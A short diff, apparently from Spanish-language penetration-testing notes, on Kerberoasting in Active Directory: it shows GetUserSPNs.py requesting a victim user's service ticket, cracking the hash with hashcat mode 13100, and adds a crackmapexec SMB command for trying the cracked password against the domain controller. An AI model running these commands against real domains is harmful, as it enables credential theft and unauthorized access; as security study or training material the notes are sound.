@@ -14,4 +14,7 @@ GetUserSPNs.py -dc-ip <ip_dc> <dominio>/<user> -request-user <user_victima> -out
 
 Una vez tenemos el hash podemos crackearlo con hashcat 13100
 
+y luego podemos probar conectarnos:
+sudo crackmapexec smb <dc_ip> -u <user> -p <pass>
+
 
